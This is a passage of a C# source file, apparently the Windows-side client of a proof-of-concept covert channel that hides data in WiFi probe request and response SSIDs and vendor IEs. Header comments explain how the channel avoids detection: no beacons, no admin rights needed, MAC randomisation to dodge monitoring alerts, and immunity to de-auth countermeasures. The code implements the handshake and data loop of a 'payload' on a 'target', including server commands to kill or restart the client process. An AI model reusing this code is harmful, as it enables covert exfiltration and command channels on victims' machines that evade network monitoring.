using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

using System.Threading;


/*
 * Info:
 * - Flow control / Communications / Protocol
 *      - the upstream channel of the system under test (target) are probe requests with data encoded in the IE for SSID
 *      and in a vendor specific IE (the latter only if apllicable, protocol tests for arival of vendor IE during connection initialization)
 *      - The downstream channel to the target are probe replies. Beacons aren't used, to keep the channel "more silent", otherwise
 *      the SSID encoded data would be shown on other devices scanning for WiFi networks.
 *      - As the probe requests are issued using scans, they arrive on all 802.11 WiFi frequencies (of the regulatory). This means the implementation is
 *      independent of the WiFi channel in use, covert channel server and target could work on different WiFi channels. 
 *      Additionally, this allows covert channel communication in both cases: 
 *          A) the target is already connected to a WiFi network (even if the 802.11 frequency differs from the one of the server)
 *          B) the target isn't connected to a WiFi network at all
 *      - no high privileges (administrator) are needed to issue scans.
 *      - Probe responses are accepted by the Windows WiFi API (spotted networks are added to the BSS list), even if the SSID doesn't fit the one from the 
 *      probe request. This allows encoding data in the SSID of the probe response, which differs from the SSID encoded data in the probe request.
 *      - As no beacons are used, the server isn't able to actively send data (which could only be seen by the target if scans are issued in high frequencies, anyway).
 *      This means the communication follows a REQUEST-REPLY-SCHEME on the lower layer, where the requests are issued by the target.
 *      - This low level REQUEST-REPLY transfer is constantly happening, by forcing the target to do active scans as fast as possible (could be throttled
 *      in future implementations, to account for more covertness and power saving on mobile targets). Due to the constant data flow, the upper
 *      layer has a permanent data carrier, which is available, as long as the target is in range and the covert channel payload is running.
 *      - A single scan period takes 4 seconds (for Wireless network drivers that meet Windows logo requirements). This means the round trip time is
 *      4 seconds, if the probe responses arrive in timely manner (before the interface hops to the next 802.11 channel during WiFi scan). If the (dynamically 
 *      generated) probe response doesn't arrive in time, the round trip time doubles.
 *      - Current implementation of the Windows Native WiFi 'WlanScan' function, allows active scanning for  a single SSID per scan. This means, sending
 *      multiple probe requests with encoded data during a single scan isn't possible. This has a huge impact on throughput of the channel (upstream)
 *      as only one data packet is "in flight" at any given time. On the other hand, this greatly simplifies the flow control, as for every sequence number
 *      an ack has to be received, before the next packet is send. For the downstream, it should be posibble to send multiple probe responses an use a Sliding
 *      Window approach to account for packet loss with multiple packets in flight. The latter is out-of-scope for this PoC, although the current protocol uses
 *      SEQuence and ACKnowledge numbers between 0 and 15 and thus is prepared for flow control improvements (On Windows 10, active scanning for multiple SSIDs
 *      at once seems to be possible with another API).
 *      - To keep the round trip time short, dynamically generated probe responses have to be delivered as fast as possible for relevant probe requests, by the server.
 *      This is achieve by further modifications on the firmware and driver stack of the BCM43430a1 SoC of a Raspberry Pi Zero, utilizing nexmon.
 *      First, the brcmfmac driver has been modified to listen for PROBE_REQUEST events, which are genrated in the firmware by default. A netlink multicast socket
 *      is used to propagate these events back from kernelspace to userspace. Additionally the firmware has been modified, to receive unicast netlink based IOCTLs which
 *      are used to push the data for the needed PROBE RESPONSES to the firmware. The firmware than creates and delivers these probe responses through the radio.
 *      Due to this approach, there's no Access Point setup needed to bring up the covert channel server. 
 *      In userland, python is used to interface with the two netlink sockets and do the backend work. The unoptimized PoC reaches response time (from probe request to probe response)
 *      roughly below 100ms, which is enough for the scan period on a single channel (nearly every probe requests receives a proper response). No tests have been done in crowded area.
 *      - The communication protocol additionally introduces the concept of client and server IDs, to identify communication partners. This approach was chosen, because the
 *      802.11 Source Address (SA) of a WiFi client could change during scans (especially on mobile devices). The IDs for clients and servers could be compared to IP addresses
 *      in the IP-Stack, but are limited to 16 (per client and per server).
 *      - Due to the protocols independency of 802.11 BSSID, SA and DA, these addresses could be changed during ongoing communications (for example to line-up with unmalicious devices
 *      and cloak the communication even further).
 *      - As the covert channel deoesn't depend on a constant 802.11 frequency, 802.11 channel hopping of the server should be possible. This hasn't been tested, but
 *      would it make even harder to monitor the covert channel communication.
 *      - Noise (non covert channel communication) is filtered by a simple approach: The SSID of covert channel frames, always has the maximum length (32 bytes), and the 
 *      last byte is the complement of a 8-bit checksum (complement to avoid all zero SSID). If possible an additional vendor IE, 238 bytes in length, is added and prepended
 *      with a checksum, too.
 *      - In summary, the protocol handles up to 16 clients, doesn't depend on a deciated 802.11 WiFi channel, isn't visible for other WiFi clients and reaches a rough througput
 *      of 260 bytes/4 seconds. With some extensions it could allow channel hopping and encryption, to circumvent easy monitoring. The Windows payload doesn't need a privileged user.
 *      As this is a PoC, no opimization have been done, nor is it tested for robustness in crowded areas. Scanning for networks in high frequency, doesn't interrupt active WiFi connections
 *      of the target, but impacts throughput of valid communication (the radio has to switch channels for scanning, while keeping comms on a single channel alive)
 *      
 * 
 * 
 */

/*
* - only one channel per client
* - client identified by SA (could change during scan, e.g. apple) --> Failover to payload based identifier needed
* - MTU depends on usability of Vendor IE in each direction, which should be tested on connection init
* - transfer rate client --> server depends on scan speed (new scan only if old one is finished)
* ---> native wifi api doesn't allow scanning for multiple SSIDs at once, could be improved with new Win10 API
* - packet transmission, transmit order and uniqeness aren't guarantied at low layer for now (UDP like)
* - covert channel data is distinguished from noise with 16 bit checksums (one for SSID and one for Vendor IE)
* - source MAC of server could vary (isn't used in covert channel data validation), this could be used to randomize
* the server's source mac (=bssid and SA), e.g. to prevent alerts from monitoring systems which react on changing
* SSIDs for the same BSSID
* - it should be noted, that the covert channel isn't impacted by active counter meassures based on
* on detection of multiple SSIDs for the same AP bssid (for instance PiHunter would start sending de-auths when
* this kind of management frames is spotted). This wouldn't affect the covert channel, because it isn't based on
* authentication or association, but on purew PROBE REQUEST/RESPONSE. Due to this fact, a de-auth would do nothing.
* To be more precise, the P4wnP1 end would even ignore the de-auth, as it only reacts on probe requests.
* 
*/

namespace NWiFi
{
    public class LimitedQueue<T>:Queue<T>
    {
        public int Limit { get; set; }
        private AutoResetEvent dataPoppedSignal;
        private AutoResetEvent dataPushedSignal;

        public LimitedQueue(int limit): base(limit)
        {
            Limit = limit;
            dataPoppedSignal = new AutoResetEvent(true);
            dataPushedSignal = new AutoResetEvent(false);
        }

        //Note: override of Enqueue not possible, as not virtual
        public void push(T item)
        {
            while (Count >= Limit)
            {
                //blocking wait for pop
                this.dataPoppedSignal.WaitOne();
            }
            base.Enqueue(item);
            this.dataPushedSignal.Set();
        }

        public bool waitForData(int timeoutMillis = -1)
        {
            if (timeoutMillis < 0)
            {
                while (Count == 0) this.dataPushedSignal.WaitOne();
                return true;
            }

            //waiting with timeout
            this.dataPushedSignal.WaitOne(timeoutMillis);
            if (Count == 0) return false;
            return true;
        }

        public T pop()
        {
            //Signal pop
            T data = base.Dequeue();
            this.dataPoppedSignal.Set();
            return data;
        }

    }

    public static class Helper
    {
        public static String ethaddr2str(byte[] eth)
        {
            return String.Format("{0:X2}:{1:X2}:{2:X2}:{3:X2}:{4:X2}:{5:X2}", eth[0], eth[1], eth[2], eth[3], eth[4], eth[5]);
        }


        //helper (DEBUG only, remove in production code)
        public static string bytes2hexStr(byte[] ba)
        {
            if (ba == null) return "null";
            string hex = BitConverter.ToString(ba);
            return hex.Replace("-", "");
        }

        public static byte[][] split(byte[] source, int index)
        {
            byte[][] result = new byte[2][];

            if (source == null) return result;

            if (source.Length < index)
            {
                result[0] = source;
                result[1] = null;
            }
            else
            {
                result[0] = new byte[index];
                result[1] = new byte[source.Length - index];

                Array.Copy(source, result[0], index);
                Array.Copy(source, index, result[1], 0, source.Length - index);
            }

            return result;
        }

        public static byte[] subArray(byte[] source, int start, int len)
        {
            byte[] result = new byte[len];
            if (source == null) return null;
            if (len < 0) return null;
            if (start < 0) return null;
            if ((start + len) > source.Length) return null;

            
            Buffer.BlockCopy(source, start, result, 0, len);
            return result;
        }
    }


    public class Packet2 //:IEquatable<Packet2>
    {
        public byte[] sa = null; //80211 SA
        public byte[] da = null; //80211 DA
        public byte clientID = 0; //logical source (as we use scanning, on some devices the 802.11 SA could change and isn't reliable)
        public byte srvID = 0; //logical destination
        public byte[] pay1 = null; //encoded in SSID
        public byte[] pay2 = null; //encoded in vendor IE (optional, only if possible)
        public byte seq = 0;
        public byte ack = 0;

        public bool FlagControlMessage = false; //If set, the payload contains a control message, pay1[0] is control message type
        public byte ctlm_type = 0;

        public const byte CTLM_TYPE_CON_INIT_REQ1 = 1;
        public const byte CTLM_TYPE_CON_INIT_RSP1 = 2;
        public const byte CTLM_TYPE_CON_INIT_REQ2 = 3;
        public const byte CTLM_TYPE_CON_INIT_RSP2 = 4;
        public const byte CTLM_TYPE_CON_RESET = 5;
        public const byte CTLM_TYPE_RESET_LISTENING_PROC = 6; // tells the Client to restart the process which is bound to the socket, ignored by server (misplaced application layer message)
        public const byte CTLM_TYPE_CLEAR_QUEUES = 7; // tells the receiver to clear inbound and outbound queue of ClientSocket
        public const byte CTLM_TYPE_KILL_CLIENT = 8; // tells the client to exit
        public const byte CTLM_TYPE_SET_CLIENT_POLL_INTERVALL = 9; // currently unused
        
	    public const byte CON_RESET_REASON_UNSPECIFIED = 0;
        public const byte CON_RESET_REASON_INVALID_CLIENT_ID = 1;
        public const byte CON_RESET_REASON_KILL_CLIENT = 2; //this isn't exactly a reason code for connection reset, but used in case CTLM_TYPE_KILL_CLIENT is received

        public const byte PAY1_MAX_LEN = 27;
        public const byte PAY2_MAX_LEN = 236;

        /*
         * Data encoding
         * 
         * SSID - 32 BYTES (pay1)
         * ----------------------
         * byte 0: pay1[0], if FlagControlMessage is set CTRL_TYPE
         * byte 1..26: pay1[0..26]
         * byte 27 ack
         * byte 28 seq
         * byte 29 flag_len bits: 0 = FlagControlMessage, 1 = reserved, 2 = reserved, 3-7 = len_pay1
         * byte 30 clientID_srvID bits: 0..3 = clientID, 4..7 = srvID
         * byte 31 chk_pay1: 8 bit checksum
         * 
         * Vendor Specific IE - 238 BYTES (pay2), could be missing
         * -----------------------------------------------------
         * 
         * byte 0..235 pay2
         * byte 236 len_pay2: 
         * byte 237 chk_pay2: 8 bit checksum
         * 
         */

        public Packet2()
        {
            this.sa = new byte[6];
            this.da = new byte[6];
        }

        public static Packet2 parse2packet(byte[] sa, byte[] da, byte[] raw_ssid_data, byte[] raw_ven_ie_data = null)
        {
            Packet2 packet = new Packet2();
            packet.sa = sa;
            packet.da = da;


            if (raw_ven_ie_data != null)
            {
                byte pay2_len = raw_ven_ie_data[236];
                packet.pay2 = new byte[pay2_len];
                Array.Copy(raw_ven_ie_data, packet.pay2, pay2_len);
            }

            packet.ack = (byte)(raw_ssid_data[27]);
            packet.seq = (byte)(raw_ssid_data[28]);

            byte flag_len = raw_ssid_data[29];
            packet.FlagControlMessage = ((flag_len & 0x80) != 0);
            if (packet.FlagControlMessage) packet.ctlm_type = raw_ssid_data[0];
            byte pay1_len = (byte)(flag_len & 0x1F);
            packet.pay1 = new byte[pay1_len];
            Array.Copy(raw_ssid_data, packet.pay1, pay1_len);

            byte clientID_srvID = raw_ssid_data[30];
            packet.clientID = (byte)(clientID_srvID >> 4);
            packet.srvID = (byte)(clientID_srvID & 0x0F);

            return packet;
        }

        public byte[] generateRawSsid(bool with_TL = false)
        {
            byte[] res = new byte[32];

            if (this.FlagControlMessage)
            {
                //assure CTLM_TYPE is set in first payload field
                if (this.pay1 == null) pay1 = new byte[1];
                pay1[0] = this.ctlm_type;
            }

            //Copy in payload (truncate)
            if (this.pay1 == null)
            {
                Console.WriteLine("Error generating raw SSID, no payload defined");
                return null;
            }
            byte pay1_len = (byte)Math.Min(28, this.pay1.Length);
            Array.Copy(this.pay1, res, pay1_len); //gets truncated to payload max len, is already padded with zeros

            // build ack_seq
            res[27] = this.ack;
            res[28] = this.seq;

            //build flag_len
            byte flag_len = pay1_len;
            if (this.FlagControlMessage) flag_len += 0x80;
            res[29] = flag_len;

            //build clientID_srvID
            byte clientID_srvID = (byte)((this.clientID << 4) | (this.srvID & 0x0F));
            res[30] = clientID_srvID;

            //build chksum
            res[31] = simpleChecksum8(res, 31);


            if (with_TL)
            {
                //prepend TL
                byte[] tmp = res;
                res = new byte[tmp.Length + 2];
                Array.Copy(tmp, 0, res, 2, tmp.Length);
                res[0] = (byte)0x00; //Type SSID
                res[1] = (byte)32; //Length 32
            }
            return res;
        }

        public byte[] generateRawVenIe(bool with_TL = true)
        {

            //Copy in payload (truncate)
            if (this.pay2 == null)
            {
                Console.WriteLine("Error generating raw venIe, no payload defined");
                return null;
            }

            byte[] res = new byte[238];
            byte pay2_len = (byte)Math.Min(236, pay2.Length);

            Array.Copy(this.pay2, res, pay2_len); //gets truncated to payload max len, is already padded with zeros

            //build len octet
            res[236] = pay2_len;

            //calculate checksum
            res[237] = simpleChecksum8(res, 237);

            if (with_TL)
            {
                //prepend TL
                byte[] tmp = res;
                res = new byte[tmp.Length + 2];
                Array.Copy(tmp, 0, res, 2, tmp.Length);
                res[0] = (byte)221; //Type Custom Vendor IE
                res[1] = (byte)238; //IE Length 238
            }
            return res;
        }

        public static bool checkLengthChecksum(byte[] raw_ssid_data, byte[] raw_ven_ie_data = null)
        {
            //desired length raw_ssid_data == 32, raw_ven_ie_data == 238 (noth without IE type and IE length)
            //checksums are calculated up to the chk_pay1/chk_pay2 field: raw_ssid_data[0..30]/raw_ven_ie_data[0..236]

            //check length of SSID field
            if (raw_ssid_data.Length != 32) return false;

            //chksum of SSID
            byte chk = Packet2.simpleChecksum8(raw_ssid_data, 31);
            if (chk != raw_ssid_data[31]) return false;

            //if raw_venIe is present, check length and chksum
            if (raw_ven_ie_data != null)
            {
                //check length
                if (raw_ven_ie_data.Length != 238) return false;

                //chksum of SSID
                chk = Packet2.simpleChecksum8(raw_ven_ie_data, 237);
                if (chk != raw_ven_ie_data[237]) return false;
            }

            return true;
        }

        public void print_out()
        {
#if DEBUG
            String s = "";
            s += String.Format("Packet\n");
            s += String.Format("\tSA:\t{0}\n", Helper.ethaddr2str(this.sa));
            s += String.Format("\tDA:\t{0}\n", Helper.ethaddr2str(this.da));

            s += String.Format("\tclientID:\t{0}\n", this.clientID);
            s += String.Format("\tsrvID:\t{0}\n", this.srvID);

            s += String.Format("\tSSID payload len:\t{0}\n", this.pay1.Length);
            s += String.Format("\tSSID payload:\t{0}\n", Helper.bytes2hexStr(this.pay1));
            if (this.pay2 == null)
                s += String.Format("\tVendor IE raw:\t{0}\n", "null");
            else
            {
                s += String.Format("\tVendor IE  payload len:\t{0}\n", this.pay2.Length);
                s += String.Format("\tVendor IE  payload:\t{0}\n", Helper.bytes2hexStr(this.pay2));
            }
            s += String.Format("\tFlag Control Message:\t{0}\n", this.FlagControlMessage);
            if (this.FlagControlMessage)
                s += String.Format("\tCTLM_TYPE:\t{0}\n", this.ctlm_type);
            s += String.Format("\tSEQ:\t{0}\n", this.seq);
            s += String.Format("\tACK:\t{0}\n", this.ack);

            Console.WriteLine(s);
#endif
        }


        public static byte[] simpleChecksum16(byte[] input, int len = -1)
        {
            UInt16 sum = 0;
            int off = 0;

            if (len == -1) len = input.Length; //Calculate for full array


            for (off = 0; off < len; off++)
            {
                sum += input[off];
                sum &= 0xFFFF; //shouldn't be needed
            }

            sum = (UInt16)~sum;

            byte[] res = new byte[2];
            res[0] = (byte)((sum & 0xFF00) >> 8);
            res[1] = (byte)(sum & 0x00FF);
            return res;
        }

        public static byte simpleChecksum8(byte[] input, int len = -1)
        {
            byte sum = 0;
            int off = 0;

            if (len == -1) len = input.Length; //Calculate for full array

            for (off = 0; off < len; off++) sum += input[off];

            return (byte)~sum;
        }

        /*
        public bool Equals(Packet2 other)
        {
            //we exclude SA and DA from comparison, as they could change during scans (Probing)

            if (this.seq != other.seq) return false;
            if (this.ack != other.ack) return false;
            if (this.clientID != other.clientID) return false;
            if (this.srvID != other.srvID) return false;
            if (this.FlagControlMessage != other.FlagControlMessage) return false;
            if (this.ctlm_type != other.ctlm_type) return false;

            if (this.pay1 == null || other.pay1 == null) { if (this.pay1 != other.pay1) return false; }
            else if (!Enumerable.SequenceEqual(this.pay1, other.pay1)) return false;

            if (this.pay2 == null || other.pay2 == null) { if (this.pay2 != other.pay2) return false; }
            else if (!Enumerable.SequenceEqual(this.pay2, other.pay2)) return false;

            return true;
        }
        */
    }

    public enum SocketState
    {
        CLOSE = 1, // communication possible
	    PENDING_OPEN = 2, // connection init started but not done
	    STATE_PENDING_ACCEPT = 3, // connection init done, but connection not accepted
	    STATE_OPEN = 4, // connection be used for communication
	    STATE_PENDING_CLOSE = 5, // connection is being transfered to close state
	    STATE_DELETE = 6 // connection is ready to be deleted
    }

    public class ClientSocket//: Socket
    {
        bool Connected = false;

        //unused
        //int ReceiveTimeout = 0;
        //int SendTimeout = 0;


        public const int MTU_WITH_VEN_IE = Packet2.PAY1_MAX_LEN + Packet2.PAY2_MAX_LEN;
        public const int MTU_WITHOUT_VEN_IE = Packet2.PAY1_MAX_LEN;

        public int MTU = ClientSocket.MTU_WITHOUT_VEN_IE;
        public bool txVenIeWorking = false;
        public bool rxVenIeWorking = false;
        public byte clientID = 0;
        public byte[] clientIV = null;

        public byte srvID = 0;

        public int socket_close_reason = 0;

        public SocketState state = SocketState.CLOSE;

        private IntPtr nwifi_client_handle;
        private Guid if_guid;

        private Packet2 last_rx_packet = null, tx_packet = null;
        private Thread send_receive_thread = null;

        private LimitedQueue<byte[]> out_queue = null;
        //ToDo: change to private after testing
        private LimitedQueue<byte[]> in_queue = null;

        public ClientSocket()//: base(SocketType.Stream, ProtocolType.IP)
        {
            this.out_queue = new LimitedQueue<byte[]>(40); //The queue holds item, which fit into a single packet ... the limit yould be seen as "maximum pending out packets"
            this.in_queue = new LimitedQueue<byte[]>(10);
        }

        private void onDisconnect(int reason_code)
        {
            Console.WriteLine(String.Format("Connection reset from server, reason code: {0}", reason_code));
            this.state = SocketState.CLOSE;
            this.socket_close_reason = reason_code;
        }

        private void onKillClient(int reason_code=0)
        {
            Console.WriteLine(String.Format("Server issued KILL CLIENT: {0}", reason_code));
            //Throw exception

            this.state = SocketState.CLOSE;
            this.socket_close_reason = Packet2.CON_RESET_REASON_KILL_CLIENT;
        }


        public bool Connect(IntPtr nativeWiFiClientHandle, Guid if_guid, byte srvID = 8, int maxAttempts = -1)
        {
            this.nwifi_client_handle = nativeWiFiClientHandle;
            this.if_guid = if_guid;
            this.srvID = srvID;

            int attempts_without_success = 0;

#if DEBUG
            Console.WriteLine(String.Format("Connect Init Request 1 (to srvID {0})...", this.srvID));
#endif

            //Create random IV for stage 1 connection init request
            Random rnd = new Random(); //PSN seeded by system clock
            this.clientIV = new byte[4];
            rnd.NextBytes(this.clientIV);


            this.tx_packet = new Packet2();
            Packet2 initReq1 = this.tx_packet;
            
            byte[] payload = new byte[5];
            payload[0] = Packet2.CTLM_TYPE_CON_INIT_REQ1;
            Buffer.BlockCopy(clientIV, 0, payload, 1, 4);

            initReq1.srvID = this.srvID;
            initReq1.ctlm_type = Packet2.CTLM_TYPE_CON_INIT_REQ1;
            initReq1.pay1 = payload;
            initReq1.pay2 = this.clientIV; //if this payload stored in vendor IE doesn't arrive the server will inform us in stage1response and we reduce MTU (pay1 only)
            initReq1.FlagControlMessage = true;
            initReq1.seq = 1;

            bool stage1finished = false;
            this.state = SocketState.PENDING_OPEN;

            while (!stage1finished)
            {
                attempts_without_success++;
                Packet2[] recv = NativeWifi.SendRecv(nativeWiFiClientHandle, if_guid, initReq1, true); //The last boolean parameter forces the scan to finish, before the method returns
                if (recv != null)
                {
                    //Atheros fix: the list of "seen probe responses" is filled until a sequence number doubles (driver doesn't
                    //flush SSID list between scans). Luckily, the results are delivered in order, which means the latest probe response received
                    //is the last entry in the BSSList. To account for this, we iterate over the BSSEntryList in reverse order and abort as soon as the
                    //outbound packet for the next scan has to be changed (tx_packe_dirty)

                    //foreach (Packet2 initResp1 in recv)
                    for (int j = (recv.Length - 1); j >= 0; j--)
                    {
                        Packet2 initResp1 = recv[j];

                        if (initResp1.ctlm_type != Packet2.CTLM_TYPE_CON_INIT_RSP1) continue; //next packet
                        if (initResp1.ack != 1) continue; //next packet
                        if (initResp1.srvID != this.srvID) continue; //received from wrong server
                        bool client_iv_valid = true;
                        for (int i = 0; i < this.clientIV.Length; i++)
                        {
                            if (this.clientIV[i] != initResp1.pay1[i+1]) { client_iv_valid = false; break; }
                        }
                        if (!client_iv_valid) continue; //next packet
                        if (initResp1.clientID == 0) continue; //ClientID 0 is reserved

                        //check if we received the ven IE from server
                        if (initResp1.pay2 != null) this.rxVenIeWorking = true;
                        else this.rxVenIeWorking = false;

                        //check if server recieved our ven IE, set MTU accordingly
                        byte ie_received = initResp1.pay1[5];
                        if (ie_received == 2) //server recieved ven IE
                        {
                            this.txVenIeWorking = true; //We're able to transmit with vendor specific IE
                            this.MTU = ClientSocket.MTU_WITH_VEN_IE;
                        }
                        else if (ie_received == 1) //server recieved request, but without ven IE
                        {
                            this.txVenIeWorking = false; //We aren't able to transmit with vendor specific IE
                            this.MTU = ClientSocket.MTU_WITHOUT_VEN_IE;
                        }
                        else continue; //something went wrong, ignore packet
                        
                        if (initResp1.pay2 != null) this.rxVenIeWorking = true; //ToDo: better test if pay2 contains the IV
                        this.clientID = initResp1.clientID;
#if DEBUG
                        Console.WriteLine(String.Format("... connect Init Response 1 received (Client ID {0} assigned)", this.clientID));
                        //initResp1.print_out();
#endif
                        this.last_rx_packet = initResp1;
                        stage1finished = true;
                    }
                }
#if DEBUG
                else Console.WriteLine("Nothing received");
#endif
                if (maxAttempts > 0)
                {
                    if (attempts_without_success >= maxAttempts && !stage1finished) return false;
                }
            }
#if DEBUG
            Console.WriteLine("Connect Init Request 2 ...");
#endif

            
            this.state = SocketState.STATE_PENDING_ACCEPT;

            //Packet2 stage2request = new Packet2();
            Packet2 initReq2 = this.tx_packet;

            payload = new byte[6];
            payload[0] = Packet2.CTLM_TYPE_CON_INIT_REQ2;
            Buffer.BlockCopy(clientIV, 0, payload, 1, 4);
            payload[5] = rxVenIeWorking ? (byte) 2 : (byte) 1;

            initReq2.pay1 = payload;
            initReq2.pay2 = this.clientIV;
            initReq2.FlagControlMessage = true;
            initReq2.ctlm_type = Packet2.CTLM_TYPE_CON_INIT_REQ2;
            initReq2.clientID = this.clientID;
            initReq2.srvID = this.srvID;
            initReq2.seq = 2;
            initReq2.ack = 1;

            //reset counter for failed attempts
            attempts_without_success = 0;

            bool stage2finished = false;
            while (!stage2finished) //ToDo: ...and no connection reset received
            {
                attempts_without_success++;
                Packet2[] recv = NativeWifi.SendRecv(nativeWiFiClientHandle, if_guid, initReq2, true); //The last boolean parameter forces the scan to finish, before the method returns
                if (recv != null)
                {
                    //Atheros fix: the list of "seen probe responses" is filled until a sequence number doubles (driver doesn't
                    //flush SSID list between scans). Luckily, the results are delivered in order, which means the latest probe response received
                    //is the last entry in the BSSList. To account for this, we iterate over the BSSEntryList in reverse order and abort as soon as the
                    //outbound packet for the next scan has to be changed (tx_packe_dirty)

                    //foreach (Packet2 initResp2 in recv)
                    for (int j = (recv.Length - 1); j >= 0; j--)
                    {
                        Packet2 initResp2 = recv[j];

                        if (!initResp2.FlagControlMessage) continue; //next packet
                        if (initResp2.srvID != this.srvID) continue; //received from wrong server
                        

                        //handle reset
                        if (initResp2.ctlm_type == Packet2.CTLM_TYPE_CON_RESET)
                        {
                            int reset_reason = Packet2.CON_RESET_REASON_UNSPECIFIED;
                            //extract reason if present
                            if (initResp2.pay1.Length > 1) reset_reason = initResp2.pay1[1];

                            this.onDisconnect(reset_reason);
                        }
                        else if (initResp2.ctlm_type == Packet2.CTLM_TYPE_KILL_CLIENT)
                        {
                            this.onKillClient();
                        }

                        if (initResp2.ack != 2) continue; //next packet
                        if (initResp2.ctlm_type != Packet2.CTLM_TYPE_CON_INIT_RSP2) continue;

                        bool rnd_valid = true;
                        for (int i = 0; i < this.clientIV.Length; i++)
                        {
                            if (this.clientIV[i] != initResp2.pay1[i+1]) { rnd_valid = false; break; }
                        }
                        if (!rnd_valid) continue; //next packet
                        if (initResp2.clientID != this.clientID) continue;
#if DEBUG
                        Console.WriteLine("... connect Init Response 2 received");
                        //initResp2.print_out();
#endif
                        this.last_rx_packet = initResp2;
                        stage2finished = true;
                        this.Connected = true;
                    }             
                }
#if DEBUG
                else Console.WriteLine("Nothing received\n");
#endif
                if (maxAttempts > 0)
                {
                    if (attempts_without_success >= maxAttempts && !stage2finished) return false;
                }
            }


            /*
             * at this point we are done with handshake and ready to send/receive data in an endless loop
             * this is done in a new thread
             */

            Console.WriteLine("Connection open, starting data tarnsfer!");
            this.state = SocketState.STATE_OPEN;

            this.send_receive_thread = new Thread(new ThreadStart(this.send_receive_loop));
            this.send_receive_thread.Start();
            //send_receive_loop();

            return true;
        }

        private void send_receive_loop()
        {
            Console.WriteLine("Starting send and receive thread");

            

            byte[] empty = new byte[0];

            Packet2 req = new Packet2();
            req.seq = 3;
            req.ack = 2;

            //Pack first payload if already data enqueued
            byte[] next_outbytes = empty;
            if (this.out_queue.Count > 0) next_outbytes = this.out_queue.pop();
            byte[][] payloads = Helper.split(next_outbytes, Packet2.PAY1_MAX_LEN);
            req.pay1 = payloads[0];
            req.pay2 = payloads[1];


            
            req.FlagControlMessage = false;
            req.clientID = this.clientID;
            req.srvID = this.srvID;

            bool new_in = false;
            bool new_out = false;

            IntPtr handle = NativeWifi.openNativeWifiHandle();

            bool indata_in_last_run = false;

            bool tx_packet_dirty = false;

            while (this.state == SocketState.STATE_OPEN)
            {
                Console.WriteLine("=========== SCAN ====================");
                Packet2[] resps = NativeWifi.SendRecv(handle, this.if_guid, req, true); 
                if (resps == null)
                {
                    Console.WriteLine("=========== SCAN END ====================");
                    continue;
                }

                tx_packet_dirty = false;


                //Atheros fix: the list of "seen probe responses" is filled until a sequence number doubles (driver doesn't
                //flush SSID list between scans). Luckily, the results are delivered in order, which means the latest probe response received
                //is the last entry in the BSSList. To account for this, we iterate over the BSSEntryList in reverse order and abort as soon as the
                //outbound packet for the next scan has to be changed (tx_packe_dirty)

                //foreach (Packet2 resp in resps) //disabled forward iteration
                for (int i = (resps.Length-1); i>=0; i--)
                {
                    Packet2 resp = resps[i];

                    if (tx_packet_dirty)
                    {
                        Console.WriteLine("Discarding rest of inbound data, as updated TX packet has to be sent first...");
                        break;
                    }

                    if (this.clientID != resp.clientID)
                    {
                        //Fix: if last outbound packet was CTLM_TYPE_CON_INIT_RSP2 and the server didn't receive it,
                        // we have to resend it,

                        Console.WriteLine("Ignoring packet for other Client");
                        continue;
                    }

                    new_in = false;
                    new_out = false;

                    if (resp.ack == req.seq)
                    {
                        Console.WriteLine("****** New OUTDATA ********");
                        new_out = true;
                        //tx_packet_dirty = true;
                    }

                    
                    byte next_resp_seq = (byte)((req.ack + 1) & 0xFF);
                    if (resp.seq == next_resp_seq)
                    {
                        Console.WriteLine("*****New INDATA*****");
                        new_in = true;
                        //tx_packet_dirty = true;
                    }
                    //two else cases a) out-of-order seq b) repeated seq --> in both cases we resend the last ack (nothing to do)


                    //DEBUG
                    if (new_in || new_out)
                    {
                        Console.WriteLine("Probe Request sent\n------------");
                        req.print_out();
                        Console.WriteLine("Received Probe Response\n-------------");
                        resp.print_out();
                    }



                    if (new_in)
                    {
                        //new indata



                        //Pushing new indata to inqueue:
                        //-----------------------------
                        //default behaviour: queue blocks pushing when full --> send_receive_loop blocks --> server isn't able to send messages AND CLIENT COULDN'T SEND EITHER; AS SCANS ARE PAUSED
                        //needed behavior: data isn't pushed when queue is full (non blocking check), next req.ack isn't allowed to be counted up --> server resends resend message till pushed to in queue
                        //Additionally empty payloads (heartbeat) should be ignored, but we push at least one empty payload to the queue if it arrives, to indicate a EOF (or end of transmission) for the Receive() method

                        //check if limit of inqueue reached
                        if (resp.FlagControlMessage)
                        {
                            //CTLM
                            if (resp.ctlm_type == Packet2.CTLM_TYPE_CON_RESET)
                            {
                                int reset_reason = Packet2.CON_RESET_REASON_UNSPECIFIED;
                                //extract reason if present
                                if (resp.pay1.Length > 1) reset_reason = resp.pay1[1];

                                this.onDisconnect(reset_reason);
                            }
                            else if(resp.ctlm_type == Packet2.CTLM_TYPE_KILL_CLIENT)
                            {
                                this.onKillClient();
                            }
                            //don't advance ack for next request
                        }

                        else if (this.state == SocketState.STATE_OPEN)
                        {
                            if (this.in_queue.Count < this.in_queue.Limit)
                            {
                                // Queue could take data, so we could acknowledge reception to server
                                req.ack = resp.seq;
                                tx_packet_dirty = true;

                                //reconstruct payload
                                int indata_len = resp.pay1.Length;
                                if (resp.pay2 != null) indata_len += resp.pay2.Length;
                                byte[] indata = new byte[indata_len];
                                Buffer.BlockCopy(resp.pay1, 0, indata, 0, resp.pay1.Length);
                                if (resp.pay2 != null) Buffer.BlockCopy(resp.pay2, 0, indata, resp.pay1.Length, resp.pay2.Length);

                                if (indata_len > 0) indata_in_last_run = true; //reset in outer loop, to influence re-scan delay
                                else indata_in_last_run = false;

                                //enqueue
                                this.in_queue.push(indata);

                            }
#if DEBUG
                            else Console.WriteLine(String.Format("Inqueue limit {0} reached, data needs to be popped to receive", this.in_queue.Limit));
#endif
                        }
#if DEBUG
                        else Console.WriteLine("Packet ignored, because socket not in OPEN state");
#endif

                        //Check if there was indata in last scan, if yes -> delay new scan to allow data processing in another thread
                        if (indata_in_last_run && (this.out_queue.Count == 0))
                        {
                            //Add a delay, to allow another thread to process inbound data, otherwise we would enter the next scan interval
                            //without any chance of processing the data to have an "reply" ready
                            Console.WriteLine(String.Format("START Forced sleep, because last response had data included... outqueue count {0}", this.out_queue.Count));
                            Thread.Sleep(100);
                            Console.WriteLine(String.Format("STOP Forced sleep, because last response had data included... outqueue count {0}", this.out_queue.Count));
                        }
                        
                        


                        if (new_out)
                        {
                            req.seq += 1;
                            req.seq &= 0xFF;
                            tx_packet_dirty = true;

                            //If outbound data is present in the queue, we send it
                            //IF NOT; AN EMPTY PAYLOAD IS SEND TO KEEP COMMUNICATION GOING (like a heartbeat) AS WE HAVE
